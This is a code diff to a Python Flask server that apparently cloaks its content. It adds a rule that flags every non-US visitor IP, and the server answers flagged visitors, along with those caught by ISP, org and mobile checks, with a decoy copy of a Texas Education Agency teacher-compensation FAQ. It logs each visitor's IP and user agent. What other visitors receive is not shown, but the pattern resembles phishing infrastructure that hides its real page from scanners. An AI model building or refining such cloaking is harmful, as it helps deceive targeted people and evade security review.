@@ -98,6 +98,10 @@ def get_ip_details(ip_address):
         ip_data = requests.get(url, headers=headers).json()
         print(ip_data)
         mobile = ip_data.get('mobile', '')
+        country_code = ip_data.get('countryCode', '').lower()
+
+        if country_code != "us":
+            return True
 
         isp = ip_data.get("isp", "").lower()
         org = ip_data.get("org", "").lower()
@@ -131,6 +135,7 @@ def serve(path):
     print("\n\n================ Ip Details ===================")
     print({"visitor_ip": visitor_ip, "user_agent": user_agent}, "\n")
 
+    # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf
     
     if get_ip_details(visitor_ip):
         return send_from_directory('','89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf')
